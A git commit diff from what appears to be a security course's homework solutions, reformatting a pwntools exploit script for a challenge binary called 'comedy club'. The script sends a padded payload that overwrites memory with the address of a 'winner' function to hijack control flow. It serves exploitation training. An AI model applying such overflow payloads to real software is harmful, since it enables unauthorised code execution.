17dfd6c2f8a8f17d4d63c980983758eb16fdccba
Sparsh <54528149+hutgrabber@users.noreply.github.com>
2024-02-29 18:15:44 -0500

    Changed WEEK3

--- solutions/WEEK_3/homework_3.py
+++ solutions/WEEK_3/homework_3.py
@@ -50,7 +50,7 @@ def start(argv=[], *a, **kw):
 binPath = "/challenge/homework"
 
 gdbscript = """
-set environment LD_PRELOAD /challenge/libc-2.27.so 
+set environment LD_PRELOAD /challenge/libc-2.27.so
 set max-visualize-chunk-size 0x500
 set glibc 2.27
 b *whatToDo+188
@@ -62,31 +62,26 @@ pwn.context.log_level = 'critical'
 io = start()
 
 winner_function = pwn.p64(0x0000000000400bed)
-try:
-    io.recvline()  # Welcome to the comedy club!
-    io.recvline()  # What is the name of your act?
-    io.recvline()  # Please set up for your act
 
-    io.sendline(b'ba')  # ba
+io.recvline()  # Welcome to the comedy club!
+io.recvline()  # What is the name of your act?
+io.recvline()  # Please set up for your act
 
-    io.recvline()  # Your act code is:
-    io.recvline()  # How long do you want the show description to be?
+io.sendline(b'ba')  # ba
+io.recvline()  # Your act code is:
+io.recvline()  # How long do you want the show description to be?
 
-    io.sendline(b'65')
+io.sendline(b'65')
 
-    io.recvline()  # Describe the show for us.
+io.recvline()  # Describe the show for us.
 
-    io.sendline(b'A' * 448 + winner_function)  # payload
-    io.recvlines(7)  # action menu
+io.sendline(b'A' * 448 + winner_function)  # payload
+io.recvlines(7)  # action menu
 
-    io.recvuntil(b'Action: ')  # Acion:
+io.recvuntil(b'Action: ')  # Acion:
 
-    io.sendline(b'1')  # 1
+io.sendline(b'1')  # 1
 
-    pwnd = io.recvline().strip().decode('utf-8')
+pwnd = io.recvline().strip().decode('utf-8')
 
-    print('\n' + pwnd + '\n')
-
-
-except EOFError:
-    pass
+print('\n' + pwnd + '\n')
